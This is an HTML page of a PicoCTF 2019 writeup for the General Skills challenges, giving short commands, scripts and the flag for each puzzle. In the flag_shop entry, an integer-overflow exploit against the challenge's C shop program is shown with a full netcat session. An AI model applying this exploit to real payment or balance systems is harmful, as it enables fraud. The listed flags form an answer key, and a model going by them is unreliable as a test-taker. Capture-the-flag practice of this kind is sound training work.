<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>PicoCTF 2019 writeup</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="general/index.html"><strong aria-hidden="true">1.</strong> General skills</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="general/0-the-factorys-secret.html"><strong aria-hidden="true">1.1.</strong> The Factory's Secret</a></li><li class="chapter-item expanded "><a href="general/1-lets-warm-up.html"><strong aria-hidden="true">1.2.</strong> Lets Warm Up</a></li><li class="chapter-item expanded "><a href="general/2-warmed-up.html"><strong aria-hidden="true">1.3.</strong> Warmed Up</a></li><li class="chapter-item expanded "><a href="general/3-2warm.html"><strong aria-hidden="true">1.4.</strong> 2Warm</a></li><li class="chapter-item expanded "><a href="general/4-bases.html"><strong aria-hidden="true">1.5.</strong> Bases</a></li><li class="chapter-item expanded "><a href="general/5-first-grep.html"><strong aria-hidden="true">1.6.</strong> First Grep</a></li><li class="chapter-item expanded "><a href="general/6-resources.html"><strong aria-hidden="true">1.7.</strong> Resources</a></li><li class="chapter-item expanded "><a href="general/7-strings-it.html"><strong aria-hidden="true">1.8.</strong> strings it</a></li><li class="chapter-item expanded "><a href="general/8-whats-a-net-cat.html"><strong aria-hidden="true">1.9.</strong> what’s a net cat?</a></li><li class="chapter-item expanded "><a href="general/9-based.html"><strong aria-hidden="true">1.10.</strong> Based</a></li><li class="chapter-item expanded "><a href="general/10-first-grep-2.html"><strong aria-hidden="true">1.11.</strong> First Grep: Part II</a></li><li class="chapter-item expanded "><a href="general/11-plumbing.html"><strong aria-hidden="true">1.12.</strong> Plumbing</a></li><li class="chapter-item expanded "><a href="general/12-whats-the-difference/index.html"><strong aria-hidden="true">1.13.</strong> whats-the-difference</a></li><li class="chapter-item expanded "><a href="general/13-where-is-the-file.html"><strong aria-hidden="true">1.14.</strong> where-is-the-file</a></li><li class="chapter-item expanded "><a href="general/14-flag_shop.html"><strong aria-hidden="true">1.15.</strong> flag_shop</a></li><li class="chapter-item expanded "><a href="general/15-mus1c.html"><strong aria-hidden="true">1.16.</strong> mus1c</a></li><li class="chapter-item expanded "><a href="general/16-1_wanna_b3_a_r0ck5tar.html"><strong aria-hidden="true">1.17.</strong> 1_wanna_b3_a_r0ck5tar</a></li></ol></li><li class="chapter-item expanded "><a href="forensics/index.html"><strong aria-hidden="true">2.</strong> Forensics</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="forensics/0-glory-of-the-gardin/index.html"><strong aria-hidden="true">2.1.</strong> Glory of the Garden</a></li><li class="chapter-item expanded "><a href="forensics/1-unzip/index.html"><strong aria-hidden="true">2.2.</strong> unzip</a></li><li class="chapter-item expanded "><a href="forensics/2-so-meta/index.html"><strong aria-hidden="true">2.3.</strong> So Meta</a></li><li class="chapter-item expanded "><a href="forensics/3-what-lies-within/index.html"><strong aria-hidden="true">2.4.</strong> What Lies Within</a></li><li class="chapter-item expanded "><a href="forensics/4-extensions/index.html"><strong aria-hidden="true">2.5.</strong> extensions</a></li><li class="chapter-item expanded "><a href="forensics/5-shark-on-wire-1/index.html"><strong aria-hidden="true">2.6.</strong> shark on wire 1</a></li><li class="chapter-item expanded "><a href="forensics/6-WhitePages/index.html"><strong aria-hidden="true">2.7.</strong> WhitePages</a></li><li class="chapter-item expanded "><a href="forensics/7-c0rrupt/index.html"><strong aria-hidden="true">2.8.</strong> c0rrupt</a></li><li class="chapter-item expanded "><a href="forensics/8-like1000/index.html"><strong aria-hidden="true">2.9.</strong> like1000</a></li><li class="chapter-item expanded "><a href="forensics/9-m00nwalk/index.html"><strong aria-hidden="true">2.10.</strong> m00nwalk</a></li><li class="chapter-item expanded "><a href="forensics/10-investigative-reversing-0/index.html"><strong aria-hidden="true">2.11.</strong> Investigative Reversing 0</a></li><li class="chapter-item expanded "><a href="forensics/11-m00nwalk2/index.html"><strong aria-hidden="true">2.12.</strong> m00nwalk2</a></li><li class="chapter-item expanded "><a href="forensics/12-shark-on-wire-2/index.html"><strong aria-hidden="true">2.13.</strong> shark on wire 2</a></li><li class="chapter-item expanded "><a href="forensics/13-investigative-reversing-1/index.html"><strong aria-hidden="true">2.14.</strong> Investigative Reversing 1</a></li><li class="chapter-item expanded "><a href="forensics/14-investigative-reversing-2/index.html"><strong aria-hidden="true">2.15.</strong> Investigative Reversing 2 (INCOMPLETE)</a></li><li class="chapter-item expanded "><a href="forensics/15-webnet0/index.html"><strong aria-hidden="true">2.16.</strong> WebNet0</a></li><li class="chapter-item expanded "><a href="forensics/16-pastaAAA/index.html"><strong aria-hidden="true">2.17.</strong> pastaAAA</a></li><li class="chapter-item expanded "><a href="forensics/17-webnet1/index.html"><strong aria-hidden="true">2.18.</strong> WebNet1</a></li></ol></li><li class="chapter-item expanded "><a href="cryptography/index.html"><strong aria-hidden="true">3.</strong> Cryptography</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cryptography/0-the-numbers/index.html"><strong aria-hidden="true">3.1.</strong> The Numbers</a></li><li class="chapter-item expanded "><a href="cryptography/1-13.html"><strong aria-hidden="true">3.2.</strong> 13</a></li><li class="chapter-item expanded "><a href="cryptography/2-easy1.html"><strong aria-hidden="true">3.3.</strong> Easy1</a></li><li class="chapter-item expanded "><a href="cryptography/3-caesar.html"><strong aria-hidden="true">3.4.</strong> caesar</a></li><li class="chapter-item expanded "><a href="cryptography/4-flags.html"><strong aria-hidden="true">3.5.</strong> Flags</a></li><li class="chapter-item expanded "><a href="cryptography/5-mr-worldwide.html"><strong aria-hidden="true">3.6.</strong> Mr-Worldwide</a></li><li class="chapter-item expanded "><a href="cryptography/6-tapping.html"><strong aria-hidden="true">3.7.</strong> Tapping</a></li><li class="chapter-item expanded "><a href="cryptography/7-la-cifra-de.html"><strong aria-hidden="true">3.8.</strong> la cifra de</a></li><li class="chapter-item expanded "><a href="cryptography/8-rsa-pop-quiz.html"><strong aria-hidden="true">3.9.</strong> rsa-pop-quiz</a></li><li class="chapter-item expanded "><a href="cryptography/9-miniRSA.html"><strong aria-hidden="true">3.10.</strong> miniRSA</a></li><li class="chapter-item expanded "><a href="cryptography/10-waves-over-lambda.html"><strong aria-hidden="true">3.11.</strong> waves over lambda</a></li><li class="chapter-item expanded "><a href="cryptography/11-b00tl3gRSA2.html"><strong aria-hidden="true">3.12.</strong> b00tl3gRSA2</a></li><li class="chapter-item expanded "><a href="cryptography/12-AES-ABC/index.html"><strong aria-hidden="true">3.13.</strong> AES-ABC</a></li><li class="chapter-item expanded "><a href="cryptography/13-b00tl3gRSA3.html"><strong aria-hidden="true">3.14.</strong> b00tl3gRSA3</a></li><li class="chapter-item expanded "><a href="cryptography/14-john_pollard.html"><strong aria-hidden="true">3.15.</strong> john_pollard</a></li></ol></li><li class="chapter-item expanded "><a href="binary/index.html"><strong aria-hidden="true">4.</strong> Binary Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="binary/0-handy-shellcode/index.html"><strong aria-hidden="true">4.1.</strong> handy-shellcode</a></li><li class="chapter-item expanded "><a href="binary/1-practice-run-1/index.html"><strong aria-hidden="true">4.2.</strong> practice-run-1</a></li><li class="chapter-item expanded "><a href="binary/2-overflow-0/index.html"><strong aria-hidden="true">4.3.</strong> overflow-0</a></li><li class="chapter-item expanded "><a href="binary/3-overflow-1/index.html"><strong aria-hidden="true">4.4.</strong> overflow-1</a></li><li class="chapter-item expanded "><a href="binary/4-slippery-shellcode/index.html"><strong aria-hidden="true">4.5.</strong> slippery-shellcode</a></li><li class="chapter-item expanded "><a href="binary/5-overflow-2/index.html"><strong aria-hidden="true">4.6.</strong> OverFlow 2</a></li><li class="chapter-item expanded "><a href="binary/6-newoverflow-1/index.html"><strong aria-hidden="true">4.7.</strong> NewOverFlow-1</a></li><li class="chapter-item expanded "><a href="binary/7-newoverflow-2/index.html"><strong aria-hidden="true">4.8.</strong> NewOverFlow-2 (INCOMPLETE)</a></li></ol></li><li class="chapter-item expanded "><a href="web/index.html"><strong aria-hidden="true">5.</strong> Web Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="web/0-insp3ct0r/index.html"><strong aria-hidden="true">5.1.</strong> Insp3ct0r</a></li><li class="chapter-item expanded "><a href="web/1-dont-use-client-side.html"><strong aria-hidden="true">5.2.</strong> dont-use-client-side</a></li><li class="chapter-item expanded "><a href="web/2-logon/index.html"><strong aria-hidden="true">5.3.</strong> logon</a></li><li class="chapter-item expanded "><a href="web/3-where-are-the-robots.html"><strong aria-hidden="true">5.4.</strong> where are the robots</a></li><li class="chapter-item expanded "><a href="web/4-Client-side-again.html"><strong aria-hidden="true">5.5.</strong> Client-side-again</a></li><li class="chapter-item expanded "><a href="web/5-Open-to-admins/index.html"><strong aria-hidden="true">5.6.</strong> Open-to-admins</a></li><li class="chapter-item expanded "><a href="web/6-picobrowser.html"><strong aria-hidden="true">5.7.</strong> picobrowser</a></li><li class="chapter-item expanded "><a href="web/7-Irish-Name-Repo-1.html"><strong aria-hidden="true">5.8.</strong> Irish-Name-Repo 1</a></li><li class="chapter-item expanded "><a href="web/8-Irish-Name-Repo-2.html"><strong aria-hidden="true">5.9.</strong> Irish-Name-Repo 2</a></li><li class="chapter-item expanded "><a href="web/9-Irish-Name-Repo-3.html"><strong aria-hidden="true">5.10.</strong> Irish-Name-Repo 3</a></li><li class="chapter-item expanded "><a href="web/10-Empire1.html"><strong aria-hidden="true">5.11.</strong> Empire1</a></li><li class="chapter-item expanded "><a href="web/11-Empire2.html"><strong aria-hidden="true">5.12.</strong> Empire2</a></li><li class="chapter-item expanded "><a href="web/12-Empire3.html"><strong aria-hidden="true">5.13.</strong> Empire3</a></li><li class="chapter-item expanded "><a href="web/13-JaWT-Scratchpad/index.html"><strong aria-hidden="true">5.14.</strong> JaWT Scratchpad</a></li><li class="chapter-item expanded "><a href="web/14-Java-Script-Kiddie/index.html"><strong aria-hidden="true">5.15.</strong> Java Script Kiddie</a></li><li class="chapter-item expanded "><a href="web/15-Java-Script-Kiddie-2/index.html"><strong aria-hidden="true">5.16.</strong> Java Script Kiddie 2</a></li><li class="chapter-item expanded "><a href="web/16-cereal-hacker-1/index.html"><strong aria-hidden="true">5.17.</strong> cereal hacker 1</a></li><li class="chapter-item expanded "><a href="web/17-cereal-hacker-2/index.html"><strong aria-hidden="true">5.18.</strong> cereal hacker 2</a></li></ol></li><li class="chapter-item expanded "><a href="reversing/READMD.html"><strong aria-hidden="true">6.</strong> Reverse Engineering</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="reversing/0-vault-door-training/READMD.html"><strong aria-hidden="true">6.1.</strong> vault-door-training</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="reversing/1-vault-door-1/index.html"><strong aria-hidden="true">6.1.1.</strong> vault-door-1</a></li><li class="chapter-item expanded "><a href="reversing/2-vault-door-3/index.html"><strong aria-hidden="true">6.1.2.</strong> vault-door-3</a></li><li class="chapter-item expanded "><a href="reversing/3-vault-door-4/index.html"><strong aria-hidden="true">6.1.3.</strong> vault-door-4</a></li><li class="chapter-item expanded "><a href="reversing/4-vault-door-5/index.html"><strong aria-hidden="true">6.1.4.</strong> vault-door-5</a></li><li class="chapter-item expanded "><a href="reversing/5-vault-door-6/index.html"><strong aria-hidden="true">6.1.5.</strong> vault-door-6</a></li><li class="chapter-item expanded "><a href="reversing/6-vault-door-7/index.html"><strong aria-hidden="true">6.1.6.</strong> vault-door-7</a></li><li class="chapter-item expanded "><a href="reversing/7-vault-door-8/index.html"><strong aria-hidden="true">6.1.7.</strong> vault-door-8</a></li></ol></li><li class="chapter-item expanded "><a href="reversing/8-asm1/index.html"><strong aria-hidden="true">6.2.</strong> asm1</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="reversing/9-asm2/index.html"><strong aria-hidden="true">6.2.1.</strong> asm2</a></li><li class="chapter-item expanded "><a href="reversing/10-asm3/index.html"><strong aria-hidden="true">6.2.2.</strong> asm3</a></li><li class="chapter-item expanded "><a href="reversing/11-asm4/index.html"><strong aria-hidden="true">6.2.3.</strong> asm4</a></li></ol></li><li class="chapter-item expanded "><a href="reversing/12-reverse_cipher/index.html"><strong aria-hidden="true">6.3.</strong> reverse_cipher</a></li><li class="chapter-item expanded "><a href="reversing/13-droids0/index.html"><strong aria-hidden="true">6.4.</strong> droids0</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="reversing/14-droids1/index.html"><strong aria-hidden="true">6.4.1.</strong> droids1</a></li><li class="chapter-item expanded "><a href="reversing/15-droids2/index.html"><strong aria-hidden="true">6.4.2.</strong> droids2</a></li><li class="chapter-item expanded "><a href="reversing/16-droids3/index.html"><strong aria-hidden="true">6.4.3.</strong> droids3</a></li><li class="chapter-item expanded "><a href="reversing/17-droids4/index.html"><strong aria-hidden="true">6.4.4.</strong> droids4</a></li></ol></li><li class="chapter-item expanded "><a href="reversing/18-Need-For-Speed/index.html"><strong aria-hidden="true">6.5.</strong> Need For Speed</a></li><li class="chapter-item expanded "><a href="reversing/19-Times-Up/index.html"><strong aria-hidden="true">6.6.</strong> Time's Up</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="reversing/20-Times-Up-Again/index.html"><strong aria-hidden="true">6.6.1.</strong> Time's Up, Again!</a></li></ol></li><li class="chapter-item expanded "><a href="reversing/21-B1ll_Gat35/index.html"><strong aria-hidden="true">6.7.</strong> B1ll_Gat35</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">PicoCTF 2019 writeup</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#general-skills" id="general-skills">General skills</a></h1>
<h1><a class="header" href="#the-factorys-secret" id="the-factorys-secret">The Factory's Secret</a></h1>
<p>This one is annoying and probably doesn't matter.</p>
<p>If you want to do it for the points, check out <a href="https://www.youtube.com/watch?v=0xHVydWvzcE">this youtube video</a></p>
<p>flag: <code>picoCTF{zerozerozerozero}</code></p>
<h1><a class="header" href="#lets-warm-up" id="lets-warm-up">Lets Warm Up</a></h1>
<p>Python:</p>
<pre><code class="language-python">chr(0x70)
</code></pre>
<p>flag: <code>picoCTF{p}</code></p>
<h1><a class="header" href="#warmed-up" id="warmed-up">Warmed Up</a></h1>
<p>Python:</p>
<pre><code class="language-python">0x3d
</code></pre>
<p>flag: <code>picoCTF{61}</code></p>
<h1><a class="header" href="#2warm" id="2warm">2Warm</a></h1>
<p>Python:</p>
<pre><code class="language-python">bin(42)
</code></pre>
<p>flag: <code>picoCTF{101010}</code></p>
<h1><a class="header" href="#bases" id="bases">Bases</a></h1>
<p>Shell:</p>
<pre><code class="language-bash">echo &quot;bDNhcm5fdGgzX3IwcDM1&quot; | base64 --decode
</code></pre>
<p>flag: <code>picoCTF{l3arn_th3_r0p35}</code></p>
<h1><a class="header" href="#first-grep" id="first-grep">First Grep</a></h1>
<p>Shell:</p>
<pre><code class="language-bash">curl https://2019shell1.picoctf.com/static/20314c5941bbf36a5eaa2e0926fb1cb5/file \
| grep pico
</code></pre>
<p>flag: <code>picoCTF{grep_is_good_to_find_things_eda8911c}</code></p>
<h1><a class="header" href="#resources" id="resources">Resources</a></h1>
<p>Go to <a href="https://picoctf.com/resources">https://picoctf.com/resources</a>
and its their.</p>
<p>Alternativly pipe curl to grep and use that</p>
<pre><code class="language-bash">curl https://picoctf.com/resources | grep picoCTF{
</code></pre>
<p>flag: <code>picoCTF{r3source_pag3_f1ag}</code></p>
<h1><a class="header" href="#strings-it" id="strings-it">strings it</a></h1>
<p>Shell:</p>
<pre><code>curl https://2019shell1.picoctf.com/static/e93edd77d319a5a634cd4d20159cbc1d/strings \
| strings | grep pico
</code></pre>
<p>flag: <code>picoCTF{5tRIng5_1T_c7fff9e5}</code></p>
<h1><a class="header" href="#whats-a-net-cat" id="whats-a-net-cat">what’s a net cat?</a></h1>
<p>Shell:</p>
<pre><code class="language-bash">nc 2019shell1.picoctf.com 37851
</code></pre>
<p>flag: <code>picoCTF{nEtCat_Mast3ry_628e0244}</code></p>
<h1><a class="header" href="#based" id="based">Based</a></h1>
<p>Here is a script that will solve it [1]. Realisticly you would do it with googleing,
but I want to say something else. <a href="https://github.com/Gallopsled/pwntools">pwntools</a>
is a very usefull python package for this. Make sure you have it.</p>
<pre><code class="language-python">from pwn import *

sh = remote('2019shell1.picoctf.com', 44303)

binary_data = sh.recvuntil('Input:\n').decode().split('\n')[2].split(' ')[3:-3]
binary_data = ''.join(map(lambda x: chr(int(x, 2)), binary_data))
sh.sendline(binary_data)

oct_data = sh.recvuntil('Input:\n').decode().split('\n')[0].split('the  ')[-1].split(' as')[0].split(' ')
oct_data = ''.join(map(lambda x: chr(int(x, 8)), oct_data))
sh.sendline(oct_data)

hex_data = sh.recvuntil('Input:\n').decode().split('\n')[0].split('the ')[-1].split(' as')[0]
hex_data = bytearray.fromhex(hex_data).decode()
sh.sendline(hex_data)

sh.interactive()
</code></pre>
<p>flag: <code>picoCTF{learning_about_converting_values_b515dfd2}</code></p>
<hr />
<ol>
<li>Script adapted to python3 from <a href="https://tcode2k16.github.io/blog/">Alan Chang's</a> <a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/general-skills/#based">exelent writeup</a></li>
</ol>
<h1><a class="header" href="#first-grep-part-ii" id="first-grep-part-ii">First Grep: Part II</a></h1>
<p>First you need to ssh into their server. Open <a href="https://2019game.picoctf.com/shell">the web shell</a> and log in.</p>
<pre><code class="language-bash">cd /problems/first-grep--part-ii_3_b4bf3244c2886de1566a28c1b5a465ae/files
grep -r pico .
</code></pre>
<p>flag: <code>picoCTF{grep_r_to_find_this_3675d798}</code></p>
<h1><a class="header" href="#plumbing" id="plumbing">Plumbing</a></h1>
<p>Shell:</p>
<pre><code>nc 2019shell1.picoctf.com 21957 | grep pico
</code></pre>
<p>flag: <code>picoCTF{digital_plumb3r_c1082838}</code></p>
<h1><a class="header" href="#whats-the-difference" id="whats-the-difference">whats-the-difference</a></h1>
<p>First download the pictures with wget</p>
<pre><code class="language-bash">wget https://2019shell1.picoctf.com/static/473cf765877f28edf95140f90cd76b59/kitters.jpg
wget https://2019shell1.picoctf.com/static/473cf765877f28edf95140f90cd76b59/cattos.jpg
</code></pre>
<p>Then using <code>rb</code> (read binary) mode, we can use python to get the diff</p>
<pre><code class="language-python">with open('./kitters.jpg', 'rb') as f:
  kitters = f.read()

with open('./cattos.jpg', 'rb') as f:
  cattos = f.read()

flag = ''
for i in range(min(len(kitters), len(cattos))):
  if kitters[i] != cattos[i]:
    flag += chr(cattos[i])

print(flag)
</code></pre>
<p>flag: <code>picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</code></p>
<hr />
<p>Script adapted to python3 from <a href="https://tcode2k16.github.io/blog/">Alan Chang's</a> <a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/general-skills/#based">exelent writeup</a></p>
<h1><a class="header" href="#where-is-the-file" id="where-is-the-file">where-is-the-file</a></h1>
<p>In unix, files starting with with <code>.</code> are hidden. To see them use the <code>-a</code> flag.</p>
<p>On their server:</p>
<pre><code class="language-bash">$ cd /problems/where-is-the-file_5_5302300652950d2248ac8bb0042d115e
$ ls -a
.  ..  .cant_see_me
$ cat .cant_see_me 
picoCTF{w3ll_that_d1dnt_w0RK_a871629e}
</code></pre>
<p>flag: <code>picoCTF{w3ll_that_d1dnt_w0RK_a871629e}</code></p>
<h1><a class="header" href="#flag_shop" id="flag_shop">flag_shop</a></h1>
<p>First get the source. I like to use <code>curl | bat</code></p>
<pre><code class="language-bash">curl https://2019shell1.picoctf.com/static/23b8f90691073c4466b11fe2bae8d6ae/store.c | bat -l c
</code></pre>
<p>The vulnrability is in here.</p>
<pre><code class="language-cpp">if (auction_choice == 1)
{
    printf(&quot;These knockoff Flags cost 900 each, enter desired quantity\n&quot;);

    int number_flags = 0;
    fflush(stdin);
    scanf(&quot;%d&quot;, &amp;number_flags);
    if (number_flags &gt; 0)
    {
        int total_cost = 0;
        total_cost = 900 * number_flags;
        printf(&quot;\nThe final cost is: %d\n&quot;, total_cost);
        if (total_cost &lt;= account_balance)
        {
            account_balance = account_balance - total_cost;
            printf(&quot;\nYour current balance after transaction: %d\n\n&quot;, account_balance);
        }
        else
        {
            printf(&quot;Not enough funds to complete purchase\n&quot;);
        }
    }
}
</code></pre>
<p>By making <code>number_flags</code>, <code>900 * number_flags</code> will underflow, so <code>total_cost</code> is negitive and we increase <code>account_balance</code>.</p>
<p>To calculate the number of flags we want to buy use <code>((1&lt;&lt;31)//900)*1.5</code> in python. The <code>(1&lt;&lt;31)</code> is the max for a <code>int</code> 
(32 bits minus one for sign). Divide by 900 as the flags cost 900 each. Times by 1.5 so we add 0.5 of the <code>int</code> range.
This gives 3579138. By buying 3579138 fake flags, we can get enough money to afford the real one.</p>
<pre><code class="language-bash">$ nc 2019shell1.picoctf.com 29250
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3579138

The final cost is: -1073743096

Your current balance after transaction: 1073744196

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_783740a8}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
3
</code></pre>
<p>flag: <code>picoCTF{m0n3y_bag5_783740a8}</code></p>
<h1><a class="header" href="#mus1c" id="mus1c">mus1c</a></h1>
<p>Some awareness of programing memes, or google-fu, will tell you that this is 
<a href="https://github.com/RockstarLang/rockstar">Rockstar</a>, &quot;a dynamically typed computer programming language, designed for creating programs that are also song lyrics&quot;.</p>
<p>By runing the lyrics with the <a href="https://codewithrockstar.com/online">online interpriter</a>, you get these numbers.</p>
<pre><code class="language-text">114
114
114
111
99
107
110
114
110
48
49
49
51
114
</code></pre>
<p>A simple ascii conversion gets the flag</p>
<pre><code class="language-python">n = [114, 114, 114, 111, 99, 107, 110, 114, 110, 48, 49, 49, 51, 114]
print(''.join(map(chr, n)))
</code></pre>
<p>flag: <code>picoCTF{rrrocknrn0113r}</code></p>
<h1><a class="header" href="#1_wanna_b3_a_r0ck5tar" id="1_wanna_b3_a_r0ck5tar">1_wanna_b3_a_r0ck5tar</a></h1>
<p>The code can be rougly transcribed to</p>
<pre><code>Rocknroll is right                  | Rocknroll = true
Silence is wrong                    | Silence = 5
A guitar is a six-string            | a_guitar = 19
Tommy's been down                   | Tommy = 44
Music is a billboard-burning razzma | Music = 160
Listen to the music                 | the_music = input()
If the music is a guitar            | if the_music == a_guitar:
Say &quot;Keep on rocking!&quot;              |     print(&quot;Keep on rocking!&quot;)
Listen to the rhythm                |     the_rhythm = input()
If the rhythm without Music is noth |     if the_rhythm - Music == False:
Tommy is rockin guitar              |         Tommy = 66
Shout Tommy!                        |         print(Tommy!)
Music is amazing sensation          |         Music = 79
Jamming is awesome presence         |         Jamming = 78
Scream Music!                       |         print(Music!)
Scream Jamming!                     |         print(Jamming!)
Tommy is playing rock               |         Tommy = 74
Scream Tommy!                       |         print(Tommy!)
They are dazzled audiences          |         They are dazzled audiences
Shout it!                           |         print(it!)
Rock is electric heaven             |         Rock = 86
Scream it!                          |         print(it!)
Tommy is jukebox god                |         Tommy = 73
Say it!                             |         print(it!)
Break it down                       |         break
Shout &quot;Bring on the rock!&quot;          |         print(&quot;Bring on the rock!&quot;)
Else Whisper &quot;That ain't it, Chief&quot; |         Else print(&quot;That ain't it,
Break it down                       |         break
</code></pre>
<p>Therefor we can deleat</p>
<pre><code>Listen to the music             
If the music is a guitar                  
Say &quot;Keep on rocking!&quot;                
Listen to the rhythm
If the rhythm without Music is nothing
...
Else Whisper &quot;That ain't it, Chief&quot;
</code></pre>
<p>To get the code</p>
<pre><code>Rocknroll is right              
Silence is wrong                
A guitar is a six-string        
Tommy's been down               
Music is a billboard-burning razzmatazz!
Tommy is rockin guitar
Shout Tommy!                    
Music is amazing sensation 
Jamming is awesome presence
Scream Music!                   
Scream Jamming!                 
Tommy is playing rock           
Scream Tommy!       
They are dazzled audiences                  
Shout it!
Rock is electric heaven                     
Scream it!
Tommy is jukebox god            
Say it!                                     
Break it down
Shout &quot;Bring on the rock!&quot;
Break it down 
</code></pre>
<p>By runing the lyrics with the <a href="https://codewithrockstar.com/online">online interpriter</a>, you get these numbers.</p>
<pre><code>66
79
78
74
79
86
73
</code></pre>
<p>A simple ascii conversion gets the flag</p>
<pre><code class="language-python">n = [66, 79, 78, 74, 79, 86, 73]
print(''.join(map(chr, n)))
</code></pre>
<p>flag: <code>picoCTF{BONJOVI}</code></p>
